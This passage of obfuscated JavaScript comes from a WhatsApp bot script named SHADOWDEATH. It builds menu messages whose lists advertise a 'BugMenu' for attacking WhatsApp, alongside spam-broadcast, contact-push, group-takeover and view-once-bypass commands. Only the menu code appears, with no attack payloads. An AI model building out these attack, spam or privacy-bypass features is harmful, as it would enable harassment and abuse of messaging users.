                    'id': ".sc"
                  }, {
                    'title': "Downloadmenu",
                    'description': "List Downloadmenu📥",
                    'id': ".downloadmenu"
                  }, {
                    'title': "Storemenu",
                    'description': "List Storemenu🛒",
                    'id': ".storemenu"
                  }, {
                    'title': "Groupmenu",
                    'description': "List Groupmenu🏘",
                    'id': '.grupmenu'
                  }, {
                    'title': "Ownermenu",
                    'description': "Ownermenu👤",
                    'id': ".ownermenu"
                  }]
                }]
              })
            },
            'viewOnce': true
          };
          _0x5ed2b0.buttons.push(_0x32fb3f);
          await _0x47285b.sendMessage(_0x2f6673.chat, _0x5ed2b0, {
            'quoted': _0x5560b2
          });
          await _0x47285b.sendMessage(_0x2f6673.chat, {
            'audio': fs.readFileSync("./image/musik1.mp3"),
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x2f6673
          });
        }
        break;
      case "funmenu":
        {
          let _0x3f8152 = [{
            'buttonId': ".owner",
            'buttonText': {
              'displayText': "▢ 𝗗͢𝗲͠𝘃𝗲𝗹𝗼͠𝗽𝗲𝗿͢ 𝗦͠𝗰𝗿𝗶𝗽𝘁"
            }
          }, {
            'buttonId': ".tqto",
            'buttonText': {
              'displayText': "▢ †q†ð"
            }
          }];
          let _0x3ce299 = {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604845970_vynx.jpg"
            },
            'caption': "Whatshapp Broo👋, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 \n`[ 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛 𝗜𝗻𝗳𝗼 ]`\n𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊\n𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊\n𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip\n𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! \n𝗦𝗶𝘁𝗲 : https.íd.co/VynxOfficial\n\n`[ 𝗠𝗮𝗶𝗻 𝗠𝗲𝗻𝘂 ]`\n◇ .cekidch\n◇ .cekidgc\n◇ .qc\n◇ .brat\n◇ .bratvid\n◇ .readviewonce\n◇ .stickerwm\n◇ .sticker\n",
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊",
                'body': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'sourceUrl': " ",
                'mediaType': 0x1,
                'renderLargerThumbnail': false
              }
            },
            'footer': '𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊',
            'buttons': _0x3f8152,
            'viewOnce': true,
            'headerType': 0x6
          };
          const _0x3e93ab = {
            'buttonId': 'action',
            'buttonText': {
              'displayText': "This Button List"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "List Menu",
                'sections': [{
                  'title': "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                  'highlight_label': "Attack Whatsapp 🕊",
                  'rows': [{
                    'title': "BugMenu",
                    'description': "Shadow Attack Whatsapp🕊",
                    'id': ".bugmenu"
                  }, {
                    'title': "MainMenu",
                    'description': "List FunMenu🛠",
                    'id': ".funmenu"
                  }, {
                    'title': "Searchmenu",
                    'description': "List Search Menu 🔍",
                    'id': ".smenu"
                  }, {
                    'title': "Toolsmenu",
                    'description': "List Toolsmenu👾",
                    'id': ".toolsmenu"
                  }, {
                    'title': "Buy Script",
                    'description': "Buy Scrpit. Shadow🛍️",
                    'id': '.sc'
                  }, {
                    'title': "Downloadmenu",
                    'description': "List Downloadmenu📥",
                    'id': ".downloadmenu"
                  }, {
                    'title': "Storemenu",
                    'description': "List Storemenu🛒",
                    'id': ".storemenu"
                  }, {
                    'title': "Groupmenu",
                    'description': "List Groupmenu🏘",
                    'id': '.grupmenu'
                  }, {
                    'title': "Ownermenu",
                    'description': "Ownermenu👤",
                    'id': '.ownermenu'
                  }]
                }]
              })
            },
            'viewOnce': true
          };
          _0x3ce299.buttons.push(_0x3e93ab);
          await _0x47285b.sendMessage(_0x2f6673.chat, _0x3ce299, {
            'quoted': _0x5560b2
          });
        }
        break;
      case 'smenu':
        {
          let _0x4bef39 = [{
            'buttonId': ".owner",
            'buttonText': {
              'displayText': "▢ 𝗗͢𝗲͠𝘃𝗲𝗹𝗼͠𝗽𝗲𝗿͢ 𝗦͠𝗰𝗿𝗶𝗽𝘁"
            }
          }, {
            'buttonId': ".tqto",
            'buttonText': {
              'displayText': "▢ †q†ð"
            }
          }];
          let _0x1ec0c2 = {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604846252_vynx.jpg"
            },
            'caption': "Whatshapp Broo👋, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 \n`[ 𝗦𝘂𝗽𝗲𝗿𝗦𝗼𝗻𝗶𝗰 𝗜𝗻𝗳𝗼 ]`\n𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊\n𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊\n𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip\n𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! \n𝗦𝗶𝘁𝗲 : https.íd.co/VynxOfficial\n\n`[ 𝗦𝗲𝗮𝗿𝗰𝗵𝗺𝗲𝗻𝘂 ]`\n◇ .yts\n◇ .apkmod\n◇ .pinterest\n◇ .gimage  \n◇ .sfile\n",
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊",
                'body': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'sourceUrl': " ",
                'mediaType': 0x1,
                'renderLargerThumbnail': false
              }
            },
            'footer': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
            'buttons': _0x4bef39,
            'viewOnce': true,
            'headerType': 0x6
          };
          const _0x4da624 = {
            'buttonId': "action",
            'buttonText': {
              'displayText': "This Button List"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "List Menu",
                'sections': [{
                  'title': "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                  'highlight_label': "Attack Whatsapp 🕊",
                  'rows': [{
                    'title': 'BugMenu',
                    'description': "Shadow Attack Whatsapp🕊",
                    'id': ".bugmenu"
                  }, {
                    'title': "MainMenu",
                    'description': "List FunMenu🛠",
                    'id': '.funmenu'
                  }, {
                    'title': 'Searchmenu',
                    'description': "List Search Menu 🔍",
                    'id': ".smenu"
                  }, {
                    'title': "Toolsmenu",
                    'description': "List Toolsmenu👾",
                    'id': ".toolsmenu"
                  }, {
                    'title': "Buy Script",
                    'description': "Buy Scrpit. Shadow🛍️",
                    'id': ".sc"
                  }, {
                    'title': 'Downloadmenu',
                    'description': "List Downloadmenu📥",
                    'id': ".downloadmenu"
                  }, {
                    'title': "Storemenu",
                    'description': "List Storemenu🛒",
                    'id': ".storemenu"
                  }, {
                    'title': "Groupmenu",
                    'description': "List Groupmenu🏘",
                    'id': ".grupmenu"
                  }, {
                    'title': "Ownermenu",
                    'description': 'Ownermenu👤',
                    'id': ".ownermenu"
                  }]
                }]
              })
            },
            'viewOnce': true
          };
          _0x1ec0c2.buttons.push(_0x4da624);
          await _0x47285b.sendMessage(_0x2f6673.chat, _0x1ec0c2, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "toolsmenu":
        {
          let _0x473dcb = [{
            'buttonId': '.owner',
            'buttonText': {
              'displayText': "▢ 𝗗͢𝗲͠𝘃𝗲𝗹𝗼͠𝗽𝗲𝗿͢ 𝗦͠𝗰𝗿𝗶𝗽𝘁"
            }
          }, {
            'buttonId': '.tqto',
            'buttonText': {
              'displayText': "▢ †q†ð"
            }
          }];
          let _0x2c6efc = {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604846668_vynx.jpg"
            },
            'caption': "Whatshapp Broo👋, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By Vynx \n`[ 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛 𝗜𝗻𝗳𝗼 ]`\n𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊\n𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊\n𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip\n𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! \n𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial\n\n`[ 𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂 ]`\n◇ .ai\n◇ .gpt\n◇ .tourl\n◇ .tourl2\n◇ .ssweb\n◇ .translate\n◇ .tohd\n◇ .shortlink\n◇ .shortlink2\n\n",
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊",
                'body': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'thumbnailUrl': 'https://img1.pixhost.to/images/6077/604853889_vynx.jpg',
                'sourceUrl': " ",
                'mediaType': 0x1,
                'renderLargerThumbnail': false
              }
            },
            'footer': '𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊',
            'buttons': _0x473dcb,
            'viewOnce': true,
            'headerType': 0x6
          };
          const _0x33f8bd = {
            'buttonId': 'action',
            'buttonText': {
              'displayText': "This Button List"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "List Menu",
                'sections': [{
                  'title': "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                  'highlight_label': "Attack Whatsapp 🕊",
                  'rows': [{
                    'title': "BugMenu",
                    'description': "Shadow Attack Whatsapp🕊",
                    'id': '.bugmenu'
                  }, {
                    'title': "MainMenu",
                    'description': "List FunMenu🛠",
                    'id': ".funmenu"
                  }, {
                    'title': "Searchmenu",
                    'description': "List Search Menu 🔍",
                    'id': ".smenu"
                  }, {
                    'title': "Toolsmenu",
                    'description': "List Toolsmenu👾",
                    'id': ".toolsmenu"
                  }, {
                    'title': "Buy Script",
                    'description': "Buy Scrpit. Shadow🛍️",
                    'id': '.sc'
                  }, {
                    'title': "Downloadmenu",
                    'description': "List Downloadmenu📥",
                    'id': '.downloadmenu'
                  }, {
                    'title': "Storemenu",
                    'description': "List Storemenu🛒",
                    'id': ".storemenu"
                  }, {
                    'title': "Groupmenu",
                    'description': "List Groupmenu🏘",
                    'id': ".grupmenu"
                  }, {
                    'title': "Ownermenu",
                    'description': 'Ownermenu👤',
                    'id': '.ownermenu'
                  }]
                }]
              })
            },
            'viewOnce': true
          };
          _0x2c6efc.buttons.push(_0x33f8bd);
          await _0x47285b.sendMessage(_0x2f6673.chat, _0x2c6efc, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "downloadmenu":
        {
          let _0x4f8673 = [{
            'buttonId': ".owner",
            'buttonText': {
              'displayText': "▢ 𝗗͢𝗲͠𝘃𝗲𝗹𝗼͠𝗽𝗲𝗿͢ 𝗦͠𝗰𝗿𝗶𝗽𝘁"
            }
          }, {
            'buttonId': ".tqto",
            'buttonText': {
              'displayText': "▢ †q†ð"
            }
          }];
          let _0x43b1e7 = {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604847056_vynx.jpg"
            },
            'caption': "Whatshapp Broo👋, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝗩𝘆𝗻𝘅𝘅 \n`[ 𝗦𝘂𝗽𝗲𝗿𝗦𝗼𝗻𝗶𝗰 𝗜𝗻𝗳𝗼 ]`\n𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊\n𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊\n𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip\n𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! \n𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial\n\n`[ 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝗠𝗲𝗻𝘂 ]`\n◇ .tiktok \n◇ .tiktokmp3\n◇ .facebook\n◇ .capcut\n◇ .instagram\n◇ .ytmp3\n◇ .ytmp4\n◇ .play\n◇ .playvid\n◇ .gitclone\n◇ .mediafire\n",
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊",
                'body': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'thumbnailUrl': 'https://img1.pixhost.to/images/6077/604853889_vynx.jpg',
                'sourceUrl': " ",
                'mediaType': 0x1,
                'renderLargerThumbnail': false
              }
            },
            'footer': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
            'buttons': _0x4f8673,
            'viewOnce': true,
            'headerType': 0x6
          };
          const _0x43972e = {
            'buttonId': "action",
            'buttonText': {
              'displayText': "This Button List"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "List Menu",
                'sections': [{
                  'title': "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                  'highlight_label': "Attack Whatsapp 🕊",
                  'rows': [{
                    'title': "BugMenu",
                    'description': "Shadow Attack Whatsapp🕊",
                    'id': '.bugmenu'
                  }, {
                    'title': 'MainMenu',
                    'description': "List FunMenu🛠",
                    'id': ".funmenu"
                  }, {
                    'title': "Searchmenu",
                    'description': "List Search Menu 🔍",
                    'id': ".smenu"
                  }, {
                    'title': "Toolsmenu",
                    'description': "List Toolsmenu👾",
                    'id': ".toolsmenu"
                  }, {
                    'title': "Buy Script",
                    'description': "Buy Scrpit. Shadow🛍️",
                    'id': ".sc"
                  }, {
                    'title': "Downloadmenu",
                    'description': "List Downloadmenu📥",
                    'id': '.downloadmenu'
                  }, {
                    'title': "Storemenu",
                    'description': "List Storemenu🛒",
                    'id': ".storemenu"
                  }, {
                    'title': "Groupmenu",
                    'description': "List Groupmenu🏘",
                    'id': ".grupmenu"
                  }, {
                    'title': 'Ownermenu',
                    'description': 'Ownermenu👤',
                    'id': ".ownermenu"
                  }]
                }]
              })
            },
            'viewOnce': true
          };
          _0x43b1e7.buttons.push(_0x43972e);
          await _0x47285b.sendMessage(_0x2f6673.chat, _0x43b1e7, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "storemenu":
        {
          let _0x9bcd7c = [{
            'buttonId': '.owner',
            'buttonText': {
              'displayText': "▢ 𝗗͢𝗲͠𝘃𝗲𝗹𝗼͠𝗽𝗲𝗿͢ 𝗦͠𝗰𝗿𝗶𝗽𝘁"
            }
          }, {
            'buttonId': ".tqto",
            'buttonText': {
              'displayText': "▢ †q†ð"
            }
          }];
          let _0x34dc6a = {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604847453_vynx.jpg"
            },
            'caption': "Whatsap Bro👋, I'm 𝗦𝘂𝗽𝗲𝗿𝗦𝗼𝗻𝗶𝗰 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 \n`[ 𝗦𝗵𝗮𝗱𝗼𝘄𝗗𝗲𝗮𝘁𝗵 𝗜𝗻𝗳𝗼 ]`\n𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊\n𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊\n𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip\n𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! \n𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial\n\n`[ 𝗦𝘁𝗼𝗿𝗲 𝗠𝗲𝗻𝘂 ]`\n◇ .addrespon\n◇ .delrespon\n◇ .listrespon\n◇ .done\n◇ .proses\n◇ .jpm\n◇ .jpm2\n◇ .jpmtesti\n◇ .jpmslide\n◇ .jpmslideht\n◇ .sendtesti\n◇ .pushkontak\n◇ .pushkontak2\n◇ .payment\n◇ .produk\n",
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊",
                'body': '𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊',
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'sourceUrl': " ",
                'mediaType': 0x1,
                'renderLargerThumbnail': false
              }
            },
            'footer': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
            'buttons': _0x9bcd7c,
            'viewOnce': true,
            'headerType': 0x6
          };
          const _0x4a8874 = {
            'buttonId': "action",
            'buttonText': {
              'displayText': "This Button List"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': 'single_select',
              'paramsJson': JSON.stringify({
                'title': "List Menu",
                'sections': [{
                  'title': "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                  'highlight_label': "Attack Whatsapp 🕊",
                  'rows': [{
                    'title': "BugMenu",
                    'description': "Shadow Attack Whatsapp🕊",
                    'id': '.bugmenu'
                  }, {
                    'title': "MainMenu",
                    'description': "List FunMenu🛠",
                    'id': ".funmenu"
                  }, {
                    'title': "Searchmenu",
                    'description': "List Search Menu 🔍",
                    'id': '.smenu'
                  }, {
                    'title': "Toolsmenu",
                    'description': "List Toolsmenu👾",
                    'id': ".toolsmenu"
                  }, {
                    'title': "Buy Script",
                    'description': "Buy Scrpit. Shadow🛍️",
                    'id': ".sc"
                  }, {
                    'title': "Downloadmenu",
                    'description': "List Downloadmenu📥",
                    'id': ".downloadmenu"
                  }, {
                    'title': "Storemenu",
                    'description': "List Storemenu🛒",
                    'id': ".storemenu"
                  }, {
                    'title': 'Groupmenu',
                    'description': "List Groupmenu🏘",
                    'id': ".grupmenu"
                  }, {
                    'title': "Ownermenu",
                    'description': "Ownermenu👤",
                    'id': ".ownermenu"
                  }]
                }]
              })
            },
            'viewOnce': true
          };
          _0x34dc6a.buttons.push(_0x4a8874);
          await _0x47285b.sendMessage(_0x2f6673.chat, _0x34dc6a, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "grupmenu":
        {
          let _0x29c8d0 = [{
            'buttonId': ".owner",
            'buttonText': {
              'displayText': "▢ 𝗗͢𝗲͠𝘃𝗲𝗹𝗼͠𝗽𝗲𝗿͢ 𝗦͠𝗰𝗿𝗶𝗽𝘁"
            }
          }, {
            'buttonId': '.tqto',
            'buttonText': {
              'displayText': "▢ †q†ð"
            }
          }];
          let _0x5d3815 = {
            'image': {
              'url': 'https://img1.pixhost.to/images/6076/604848057_vynx.jpg'
            },
            'caption': "Haii kak👋, I'm 𝗦𝘂𝗽𝗲𝗿𝗦𝗼𝗻𝗶𝗰 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 \n`[ 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 𝗜𝗻𝗳𝗼 ]`\n𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊\n𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊\n𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip\n𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! \n𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial\n\n`[ 𝗚𝗿𝗼𝘂𝗽 𝗠𝗲𝗻𝘂 ]` \n◇ .antilink\n◇ .antilink2\n◇ .blacklistjpm\n◇ .welcome\n◇ .add\n◇ .kick\n◇ .close\n◇ .open\n◇ .hidetag\n◇ .kudetagc\n◇ .leave\n◇ .tagall\n◇ .promote\n◇ .demote\n◇ .resetlinkgc\n◇ .linkgc\n",
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊",
                'body': '𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊',
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'sourceUrl': " ",
                'mediaType': 0x1,
                'renderLargerThumbnail': false
              }
            },
            'footer': '𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊',
            'buttons': _0x29c8d0,
            'viewOnce': true,
            'headerType': 0x6
          };
          const _0x27d095 = {
            'buttonId': 'action',
            'buttonText': {
              'displayText': "This Button List"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "List Menu",
                'sections': [{
                  'title': "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                  'highlight_label': "Attack Whatsapp 🕊",
                  'rows': [{
                    'title': "BugMenu",
                    'description': "Shadow Attack Whatsapp🕊",
                    'id': '.bugmenu'
                  }, {
                    'title': "MainMenu",
                    'description': "List FunMenu🛠",
                    'id': '.funmenu'
                  }, {
                    'title': "Searchmenu",
                    'description': "List Search Menu 🔍",
                    'id': ".smenu"
                  }, {
                    'title': "Toolsmenu",
                    'description': "List Toolsmenu👾",
                    'id': ".toolsmenu"
                  }, {
                    'title': "Buy Script",
                    'description': "Buy Scrpit. Shadow🛍️",
                    'id': '.sc'
                  }, {
                    'title': "Downloadmenu",
                    'description': "List Downloadmenu📥",
                    'id': '.downloadmenu'
                  }, {
                    'title': "Storemenu",
                    'description': "List Storemenu🛒",
                    'id': ".storemenu"
                  }, {
                    'title': "Groupmenu",
                    'description': "List Groupmenu🏘",
                    'id': '.grupmenu'
                  }, {
                    'title': "Ownermenu",
                    'description': 'Ownermenu👤',
                    'id': '.ownermenu'
                  }]
                }]
              })
            },
            'viewOnce': true
          };
          _0x5d3815.buttons.push(_0x27d095);
          await _0x47285b.sendMessage(_0x2f6673.chat, _0x5d3815, {
            'quoted': _0x5560b2
          });
        }
        break;
      case 'ownermenu':
        {
          let _0x288a42 = [{
            'buttonId': '.owner',
            'buttonText': {
              'displayText': "▢ 𝗗͢𝗲͠𝘃𝗲𝗹𝗼͠𝗽𝗲𝗿͢ 𝗦͠𝗰𝗿𝗶𝗽𝘁"
            }
          }, {
            'buttonId': '.tqto',
            'buttonText': {
              'displayText': "▢ †q†ð"
            }
          }];
          let _0x19a931 = {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604849078_vynx.jpg"
            },
            'caption': "Haii kak👋, I'm 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 Script Whatsapp Bot Create By 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊 \n`[ 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 𝗜𝗻𝗳𝗼 ]`\n𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 : 𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊\n𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊\n𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 4 Vip\n𝗦𝘁𝗮𝘁𝘂𝘀 : Vip Buy Only!! \n𝗦𝗶𝘁𝗲 : íd.co/VynxOfficial\n\n`[ 𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂 ]`\n◇ .autoread\n◇ .autopromosi\n◇ .autoreadsw\n◇ .autotyping\n◇ .addowner\n◇ .listowner\n◇ .delowner\n◇ .public\n◇ .self\n◇ .subdomain\n◇ .setimgmenu\n◇ .setimgfake\n◇ .setppbot\n◇ .clearsession\n◇ .clearchat\n◇ .resetdb\n◇ .restartbot\n◇ .getsc\n◇ .getcase\n◇ .listgc\n◇ .joingc\n◇ .joinch\n◇ .upchannel\n◇ .upchannel2\n◇ .ambilq\n",
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝐕𝐲𝐧𝐱 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥 🕊",
                'body': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
                'thumbnailUrl': "https://img1.pixhost.to/images/6077/604853889_vynx.jpg",
                'sourceUrl': " ",
                'mediaType': 0x1,
                'renderLargerThumbnail': false
              }
            },
            'footer': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
            'buttons': _0x288a42,
            'viewOnce': true,
            'headerType': 0x6
          };
          const _0x4df797 = {
            'buttonId': "action",
            'buttonText': {
              'displayText': "This Button List"
            },
            'type': 0x4,
            'nativeFlowInfo': {
              'name': "single_select",
              'paramsJson': JSON.stringify({
                'title': "List Menu",
                'sections': [{
                  'title': "𝗟𝗶𝘀𝘁 𝗠𝗲𝗻𝘂 𝗕𝗼𝘁",
                  'highlight_label': "Attack Whatsapp 🕊",
                  'rows': [{
                    'title': "BugMenu",
                    'description': "Shadow Attack Whatsapp🕊",
                    'id': ".bugmenu"
                  }, {
                    'title': "MainMenu",
                    'description': "List FunMenu🛠",
                    'id': '.funmenu'
                  }, {
                    'title': 'Searchmenu',
                    'description': "List Search Menu 🔍",
                    'id': ".smenu"
                  }, {
                    'title': "Toolsmenu",
                    'description': "List Toolsmenu👾",
                    'id': ".toolsmenu"
                  }, {
                    'title': "Buy Script",
                    'description': "Buy Scrpit. Shadow🛍️",
                    'id': ".sc"
                  }, {
                    'title': 'Downloadmenu',
                    'description': "List Downloadmenu📥",
                    'id': ".downloadmenu"
                  }, {
                    'title': "Storemenu",
                    'description': "List Storemenu🛒",
                    'id': ".storemenu"
                  }, {
                    'title': "Groupmenu",
                    'description': "List Groupmenu🏘",
                    'id': ".grupmenu"
                  }, {
                    'title': "Ownermenu",
                    'description': "Ownermenu👤",
                    'id': ".ownermenu"
                  }]
                }]
              })
            },
            'viewOnce': true
          };
          _0x19a931.buttons.push(_0x4df797);
          await _0x47285b.sendMessage(_0x2f6673.chat, _0x19a931, {
            'quoted': _0x5560b2
          });
        }
        break;
      case "allfitur":
        {
          let _0x5bab0b = "Whatshapp Broo👋 " + _0x5ac620() + ", ingin melihat semua menu script 𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊 ya? ketik *.allmenu*\n";
          let _0x545f15 = [{
            'buttonId': ".allmenu",
            'buttonText': {
              'displayText': "𝗔͢𝗹͠𝗹𝗠͢𝗲͠𝗻͠𝘂"
            }
          }];
          let _0x4ed2c1 = {
            'image': {
              'url': "https://img1.pixhost.to/images/6076/604849511_vynx.jpg"
            },
            'gifPlayback': true,
            'caption': _0x5bab0b,
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "𝗦𝗛𝗔𝗗𝗢𝗪𝗗𝗘𝗔𝗧𝗛🕊",
